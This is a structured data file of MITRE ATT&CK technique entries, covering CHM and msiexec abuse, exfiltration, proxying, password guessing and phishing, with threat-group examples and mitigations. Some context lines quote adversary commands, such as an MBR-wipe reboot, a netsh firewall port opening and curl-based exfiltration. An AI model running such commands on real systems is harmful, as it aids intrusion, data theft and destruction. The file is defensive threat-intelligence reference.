{"text": " Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program) A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)", "idx": "https://attack.mitre.org/techniques/T1218/001", "title": "Compiled HTML File", "entity": "Compiled HTML File", "entity_type": "techniques", "entity_context": ["Silence has weaponized CHM files in their phishing campaigns.", "OilRig has used a CHM payload to load and execute another malicious file once delivered to a victim.", "Consider using application control to prevent execution of hh.exe if it is not required for a given system or network to prevent potential misuse by adversaries.", "APT41 used compiled HTML (.chm) files for targeting. ", "Lazarus Group has used CHM files to move concealed payloads.", "Consider blocking download/transfer and execution of potentially uncommon file types known to be used in adversary campaigns, such as CHM files", "Dark Caracal leveraged a compiled HTML file that contained a command to download and run an executable.", "Astaroth uses ActiveX objects for file execution and manipulation. "], "is_subtechnique": true}
{"text": " Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078). Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.", "idx": "https://attack.mitre.org/techniques/T1556", "title": "Modify Authentication Process", "entity": "Modify Authentication Process", "entity_type": "techniques", "entity_context": ["Ebury can intercept private keys using a trojanized <code>ssh-add</code> function.", "Restrict write access to the /Library/Security/SecurityAgentPlugins directory.", "Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs. ", "Kessel has trojanized the <sode>ssh_login</code> and <code>user-auth_pubkey</code> functions to steal plaintext credentials.", "Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (C:\\Windows\\System32\\ by default) of a domain controller and/or local computer with a corresponding entry in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages. ", "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. \n\nLimit access to the root account and prevent users from modifying protected components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities.", "Enabled features, such as Protected Process Light (PPL), for LSA."], "is_subtechnique": false}
{"text": " Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) Msiexec.exe is digitally signed by Microsoft. Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)", "idx": "https://attack.mitre.org/techniques/T1218/007", "title": "Msiexec", "entity": "Msiexec", "entity_type": "techniques", "entity_context": ["Melcoz can use MSI files with embedded VBScript for execution.", "Chaes has used .MSI files as an initial way to start the infection chain.", "Maze has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using <code>msiexec</code>.", "LoudMiner used an MSI installer to install the virtualization software.\t", "Duqu has used <code>msiexec</code> to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.", "Restrict execution of Msiexec.exe to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage.", "Consider disabling the <code>AlwaysInstallElevated</code> policy to prevent elevated execution of Windows Installer packages.", "IcedID can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application. ", "TA505 has used <code>msiexec</code> to download and execute malicious Windows Installer files.", "Metamorfo has used MsiExec.exe to automatically execute files. ", "Rancor has used <code>msiexec</code> to download and execute malicious installer files over HTTP.", "Molerats has used msiexec.exe to execute an MSI payload. ", "AppleJeus has been installed via MSI installer.", "Javali has used the MSI installer to download and execute malicious payloads.", "Ragnar Locker has been delivered as an unsigned MSI package that was executed with <code>msiexec.exe</code>.", "ZIRCONIUM has used the msiexec.exe command-line utility to download and execute malicious MSI files.", "Machete has used msiexec to install the Machete malware.", "Clop can use msiexec.exe to disable security tools on the system. ", "Grandoreiro can use MSI files to execute DLLs.", "RemoteUtilities can use Msiexec to install a service.", "QakBot can use MSIExec to spawn multiple cmd.exe processes."], "is_subtechnique": true}
{"text": " Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.", "idx": "https://attack.mitre.org/techniques/T1562", "title": "Impair Defenses", "entity": "Impair Defenses", "entity_type": "techniques", "entity_context": ["Stuxnet reduces the integrity level of objects to allow write actions.", "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security/logging services.", "Ensure proper Registry permissions are in place to prevent adversaries from disabling or interfering with security/logging services.", "Ensure proper process and file permissions are in place to prevent adversaries from disabling or interfering with security/logging services."], "is_subtechnique": false}
{"text": " Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use. These scans may also include more broad attempts to [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592) that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.(Citation: OWASP Vuln Scanning) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).", "idx": "https://attack.mitre.org/techniques/T1595/002", "title": "Vulnerability Scanning", "entity": "Vulnerability Scanning", "entity_type": "techniques", "entity_context": ["APT28 has performed large-scale scans in an attempt to find vulnerable servers.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.", "TeamTNT has scanned for vulnerabilities in IoT devices and other related resources such as the Docker API.", "Volatile Cedar has performed vulnerability scans of the target server.", "Sandworm Team has scanned network infrastructure for vulnerabilities as part of its operational planning.", "APT29 has conducted widespread scanning of target environments to identify vulnerabilities for exploit."], "is_subtechnique": true}
{"text": " Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).", "idx": "https://attack.mitre.org/techniques/T1590/003", "title": "Network Trust Dependencies", "entity": "Network Trust Dependencies", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": true}
{"text": " Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.", "idx": "https://attack.mitre.org/techniques/T1048/003", "title": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "entity": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "entity_type": "techniques", "entity_context": ["Thrip has used WinSCP to exfiltrate data from a targeted organization over FTP.", "CosmicDuke exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level. ", "Agent Tesla has routines for exfiltration over SMTP, FTP, and HTTP.", "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.", "Kessel can exfiltrate credentials and other information via HTTP POST request, TCP, and DNS.", "Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.", "Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network. ", "KONNI has used FTP to exfiltrate reconnaissance data out.", "FTP may be used to exfiltrate data separate from the main command and control protocol.", "Carbon uses HTTP to send data to the C2 server.", "Some Brave Prince variants have used South  Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.", "CookieMiner has used the <code>curl --upload-file</code> command to exfiltrate data over HTTP.", "FIN6 has sent stolen payment card data to remote servers via HTTP POSTs.", "CORALDECK has exfiltrated data in HTTP POST headers.", "Remsec can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.", "APT33 has used FTP to exfiltrate files (separately from the C2 channel).", "OilRig has exfiltrated data over FTP separately from its primary C2 channel over DNS.", "WindTail has the ability to automatically exfiltrate files using the macOS built-in utility /usr/bin/curl.", "Data loss prevention can detect and block sensitive data being sent over unencrypted protocols.", "FIN8 has used FTP to exfiltrate collected data.", "PoetRAT has used FTP for exfiltration.", "Dok exfiltrates logs of its execution stored in the <code>/tmp</code> folder over FTP using the <code>curl</code> command. ", "APT32's backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.", "Wizard Spider has exfiltrated victim information using FTP.", "BITSAdmin can be used to create BITS Jobs to upload files from a compromised host.", "Cherry Picker exfiltrates files over FTP."], "is_subtechnique": true}
{"text": " Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised network infrastructure. Traffic mirroring is a native feature for some network devices and used for network analysis and may be configured to duplicate traffic and forward to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring) (Citation: Juniper Traffic Mirroring) Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other network infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.", "idx": "https://attack.mitre.org/techniques/T1020/001", "title": "Traffic Duplication", "entity": "Traffic Duplication", "entity_type": "techniques", "entity_context": ["Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS."], "is_subtechnique": true}
{"text": " Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer.(Citation: Microsoft Shutdown Oct 2017) Shutting down or rebooting systems may disrupt access to computer resources for legitimate users. Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)", "idx": "https://attack.mitre.org/techniques/T1529", "title": "System Shutdown/Reboot", "entity": "System Shutdown/Reboot", "entity_type": "techniques", "entity_context": ["APT38 has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR.", "LookBack can shutdown and reboot the victim machine.", "APT37 has used malware that will issue the command <code>shutdown /r /t 1</code> to reboot a system after wiping its MBR.", "LockerGoga has been observed shutting down infected systems.", "Olympic Destroyer will shut down the compromised system after it is done modifying system configuration settings.", "Maze has issued a shutdown command on a victim machine that, upon reboot, will run the ransomware within a VM.", "Lazarus Group has rebooted systems after destroying files and wiping the MBR on infected systems.", "KillDisk attempts to reboot the machine by terminating specific processes.", "Shamoon will reboot the infected system once the wiping functionality has been completed.\t", "NotPetya will reboot the system one hour after infection."], "is_subtechnique": false}
{"text": " Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users) Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.", "idx": "https://attack.mitre.org/techniques/T1136/003", "title": "Cloud Account", "entity": "Cloud Account", "entity_type": "techniques", "entity_context": ["Do not allow privileged accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.", "Use multi-factor authentication for user and privileged accounts.", "Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of cloud systems."], "is_subtechnique": true}
{"text": " An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)", "idx": "https://attack.mitre.org/techniques/T1491/001", "title": "Internal Defacement", "entity": "Internal Defacement", "entity_type": "techniques", "entity_context": ["Lazarus Group replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a Disk Structure Wipe", "Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."], "is_subtechnique": true}
{"text": " Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.", "idx": "https://attack.mitre.org/techniques/T1565/002", "title": "Transmitted Data Manipulation", "entity": "Transmitted Data Manipulation", "entity_type": "techniques", "entity_context": ["APT38 has used DYEPACK to manipulate SWIFT messages en route to a printer.", "Metamorfo has a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address. ", "LightNeuron is capable of modifying email content, headers, and attachments during transit.", "Encrypt all important data flows to reduce the impact of tailored modifications on data in transit.", "Melcoz can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary."], "is_subtechnique": true}
{"text": " Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.(Citation: FireEye Outlook Dec 2019) Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.", "idx": "https://attack.mitre.org/techniques/T1480", "title": "Execution Guardrails", "entity": "Execution Guardrails", "entity_type": "techniques", "entity_context": ["VaporRage has the ability to check for the presence of a specific DLL and terminate if it is not found.", "NativeZone can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components.", "BitPaymer compares file names and paths to a list of excluded names and directory names during encryption.", "Execution Guardrails likely should not be mitigated with preventative controls because it may protect unintended targets from being compromised. If targeted, efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior if compromised.", "Stuxnet checks for specific operating systems on 32-bit machines, Registry keys, and dates for vulnerabilities, and will exit execution if the values are not met. ", "Anchor can terminate itself if specific execution flags are not present.", "EnvyScout can call <code>window.location.pathname</code> to ensure that embedded files are being executed from the C: drive, and will terminate if they are not.", "SUNSPOT only replaces SolarWinds Orion source code if the MD5 checksums of both the original source code file and backdoored replacement source code match hardcoded values. ", "BoomBox can check its current working directory and for the presence of a specific file and terminate if specific values are not found."], "is_subtechnique": false}
{"text": " Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data. Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image](https://attack.mitre.org/techniques/T1601), forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks)", "idx": "https://attack.mitre.org/techniques/T1600/002", "title": "Disable Crypto Hardware", "entity": "Disable Crypto Hardware", "entity_type": "techniques", "entity_context": [], "is_subtechnique": true}
{"text": " Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser) A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights. Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)", "idx": "https://attack.mitre.org/techniques/T1185", "title": "Browser Session Hijacking", "entity": "Browser Session Hijacking", "entity_type": "techniques", "entity_context": ["Close all browser sessions regularly and when they are no longer needed.", "IcedID has used web injection attacks to redirect victims to spoofed sites designed to harvest banking and other credentials.  IcedID can use a self signed TLS certificate in connection with the spoofed site and simultaneously maintains a live connection with the legitimate site to display the correct URL and certificates in the browser.", "Agent Tesla has the ability to use form-grabbing to extract data from web data forms.", "Carberp has captured credentials when a user performs login through a SSL session.", "Ursnif has injected HTML codes into banking sites to steal sensitive online banking information (ex: usernames and passwords).", "Since browser pivoting requires a high integrity process to launch from, restricting user permissions and addressing Privilege Escalation and Bypass User Account Control opportunities can limit the exposure to this technique.", "Cobalt Strike can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.", "Dridex can perform browser attacks via web injects to steal information such as credentials, certificates, and cookies.", "Melcoz can monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background.", "Grandoreiro can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.", "TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.", "QakBot can use advanced web injects to steal web banking credentials.", "Chaes has used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts."], "is_subtechnique": false}
{"text": " Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic. Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.", "idx": "https://attack.mitre.org/techniques/T1090", "title": "Proxy", "entity": "Proxy", "entity_type": "techniques", "entity_context": ["APT41 used a tool called CLASSFON to covertly proxy network communications.", "HARDRAIN uses the command <code>cmd.exe /c netsh firewall add portopening TCP 443 \"adp\"</code> and makes the victim machine function as a proxy server.", "Cardinal RAT can act as a reverse proxy.", "Remcos uses the infected hosts as SOCKS5 proxies to allow for tunneling and proxying.", "SombRAT has the ability to use an embedded SOCKS proxy in C2 communications.", "A TYPEFRAME variant can force the compromised system to function as a proxy server.", "QuasarRAT can communicate over a reverse proxy using SOCKS5.", "NETWIRE can implement use of proxies to pivot traffic.", "PoshC2 contains modules that allow for use of proxies in command and control.", "SDBbot has the ability to use port forwarding to establish a proxy between a target host and C2.", "Ngrok can be used to proxy connections to machines located behind NAT or firewalls.", "Aria-body has the ability to use a reverse SOCKS proxy module.", "AuditCred can utilize proxy for communications.", "Kessel can use a proxy during exfiltration if set in the configuration.", "Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network allow and block lists. It should be noted that this kind of blocking may be circumvented by other techniques like Domain Fronting.", "BADCALL functions as a proxy server between the victim and C2 server.", "XTunnel relays traffic between a C2 server and a victim.", "TSCookie has the ability to proxy communications with command and control (C2) servers.", "RainyDay can use proxy tools including boost_proxy_client for reverse proxy functionality.", "Dridex contains a backconnect module for tunneling network traffic through a victim's computer. Infected computers become part of a P2P botnet that can relay C2 traffic to other infected peers. ", "Vasport is capable of tunneling though a proxy.", "PLEAD has the ability to proxy network communications.", "jRAT can serve as a SOCKS proxy server.", "Ursnif has used a peer-to-peer (P2P) network for C2.", "netsh can be used to set up a proxy tunnel to allow remote host access to an infected host.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. ", "Socksbot can start SOCKS proxy threads.", "HOPLIGHT has multiple proxy options that mask traffic between the malware and the remote operators.\t\n", "Windigo has delivered a generic Windows proxy Win32/Glubteta.M. Windigo has also used multiple reverse proxy chains as part of their C2 infrastructure.", "HTRAN can proxy TCP socket connections to obfuscate command and control infrastructure.", "Blue Mockingbird has used frp, ssf, and Venom to establish SOCKS proxy connections.", "Sandworm Team's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally.\t", "Turla RPC backdoors have included local UPnP RPC proxies.\t", "Operation Wocao has used a custom proxy tool called \"Agent\" which has support for multiple hops.", "Fox Kitten has used the open source reverse proxy tools including FRPC and Go Proxy to establish connections from C2 to local servers.", "If it is possible to inspect HTTPS traffic, the captures can be analyzed for connections that appear to be domain fronting.", "ZxShell can set up an HTTP or SOCKS proxy. "], "is_subtechnique": false}
{"text": " Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts. Guessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver) Typically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following: * SSH (22/TCP) * Telnet (23/TCP) * FTP (21/TCP) * NetBIOS / SMB / Samba (139/TCP & 445/TCP) * LDAP (389/TCP) * Kerberos (88/TCP) * RDP / Terminal Services (3389/TCP) * HTTP/HTTP Management Services (80/TCP & 443/TCP) * MSSQL (1433/TCP) * Oracle (1521/TCP) * MySQL (3306/TCP) * VNC (5900/TCP) In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018) In default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.", "idx": "https://attack.mitre.org/techniques/T1110/001", "title": "Password Guessing", "entity": "Password Guessing", "entity_type": "techniques", "entity_context": ["Lucifer has attempted to brute force TCP ports 135 (RPC) and 1433 (MSSQL) with the default username or list of usernames and    passwords.", "Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out.", "Pony has used a small dictionary of common passwords against a collected list of local accounts.\t", "Emotet has been observed using a hard coded list of passwords to brute force user accounts.  ", "P.A.S. Webshell can use predefined users and passwords to execute brute force attacks against SSH, FTP, POP3, MySQL, MSSQL, and PostgreSQL services.", "CrackMapExec can brute force passwords for a specified user on a single target system or across an entire network.", "Refer to NIST guidelines when creating password policies. ", "China Chopper's server component can perform brute force password guessing against authentication portals.", "Xbash can obtain a list of weak passwords from the C2 server to use for brute forcing as well as attempt to brute force services with open ports.", "SpeakUp can perform brute forcing using a pre-defined list of usernames and passwords in an attempt to log in to administrative panels. ", "APT28 has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days. APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks.", "Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services."], "is_subtechnique": true}
{"text": " Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns. Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source.", "idx": "https://attack.mitre.org/techniques/T1566", "title": "Phishing", "entity": "Phishing", "entity_type": "techniques", "entity_context": ["Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation.", "Anti-virus can automatically quarantine suspicious files.", "Determine if certain websites or attachment types (ex: .scr, .exe, .pif, .cpl, etc.) that can be used for phishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk.", "Dragonfly has used spearphising campaigns to gain access to victims.", "Network intrusion prevention systems and systems designed to scan and remove malicious email attachments or links can be used to block activity.", "GOLD SOUTHFIELD has conducted malicious spam (malspam) campaigns to gain access to victim's machines.", "Users can be trained to identify social engineering techniques and phishing emails."], "is_subtechnique": false}
